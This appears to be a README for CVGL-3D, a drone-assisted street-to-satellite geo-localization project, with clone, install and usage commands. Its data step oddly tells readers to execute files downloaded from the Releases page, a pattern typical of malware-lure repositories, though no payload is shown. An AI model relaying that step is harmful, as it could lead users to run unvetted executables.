## Overview
The CVGL-3D project is part of the 2025 ACM MM UAV workshop. It focuses on the innovative paper titled "SkyLink: Unifying Street-Satellite Geo-Localization via UAV-Mediated 3D Scene Alignment." This research explores the intersection of street-level imagery and satellite data, leveraging UAV technology to enhance geo-localization accuracy.

### Key Features
- **UAV Integration**: Utilize drones for data collection and scene alignment.
- **3D Scene Alignment**: Align 3D models with street and satellite images.
- **Geo-Localization**: Improve accuracy in geo-localization tasks.

## Installation
To set up the CVGL-3D project, follow these steps:

1. **Clone the Repository**
   ```bash
   git clone https://github.com/HassanSalih221/CVGL-3D.git
   cd CVGL-3D
   ```

2. **Install Dependencies**
   Make sure you have Python 3.8 or higher installed. Then, install the required packages:
   ```bash
   pip install -r requirements.txt
   ```

3. **Download the Required Data**
   Visit the [Releases](https://github.com/HassanSalih221/CVGL-3D/releases) section to download the necessary datasets. Follow the instructions provided there to execute the downloaded files.

## Usage
To run the CVGL-3D project, use the following command:

```bash
python main.py --input your_input_file --output your_output_file
```

Replace `your_input_file` with the path to your input data and `your_output_file` for the results.

### Example
Hereâ€™s a simple example of how to use the project:

```bash
python main.py --input data/street_image.jpg --output results/aligned_output.jpg
```

This command aligns the street image with the satellite data and saves the output.
